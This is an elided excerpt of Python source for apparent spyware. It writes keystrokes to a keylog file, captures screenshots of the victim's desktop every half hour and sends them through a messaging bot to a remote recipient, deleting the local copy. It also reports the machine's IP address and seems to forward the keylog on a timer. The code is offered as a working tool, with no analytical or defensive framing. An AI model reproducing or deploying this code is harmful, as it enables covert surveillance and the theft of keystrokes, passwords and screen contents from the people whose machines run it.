...
_keypath=os.path.dirname(os.path.abspath(__file__))
_keylogger_Path = _keypath + "\\"+ 'keylog.txt'
...
def ScreenShot():
    try:
        import pyautogui
        name = 'ScreenShots'
        pyautogui.screenshot().save(_keypath + "\\"+ name + '.png')
        img = open(name + '.png','rb')
        bot.sendPhoto(reci_id,img)
        os.remove(_keypath + "\\"+ name + '.png')
    except:
        pass
...
class _Offilne_Function(the.Thread):
    def __init__(self) -> None:
        ...
        self.ScreenShot_Bool = False
        self.Send_Loog=False
        self.dd=True
    ...
    def Make_true_Screnshot(self):
        self.ScreenShot_Bool = True

    def Make_true_loog(self):
        self.Send_Loog=True

    def run(self):
        ScreenShot()
        Timer(1800,self.Make_true_Screnshot)
        Timer(14400,self.Make_true_loog)
        while not self._stop_event.is_set():
            if self.ScreenShot_Bool == True:
                ScreenShot()
                Send_message(Name + " : " + "Connection Establiste at " + str(_Now_Date)  +" from  this IP " +  " : " + IP_Adress)
                self.ScreenShot_Bool=False
                Timer(1800,self.Make_true_Screnshot)
            if (datetime.datetime.now().hour == 15 and self.dd) or self.Send_Loog == True:
...
#_Offilne_Function_Do = _Offilne_Function().run()
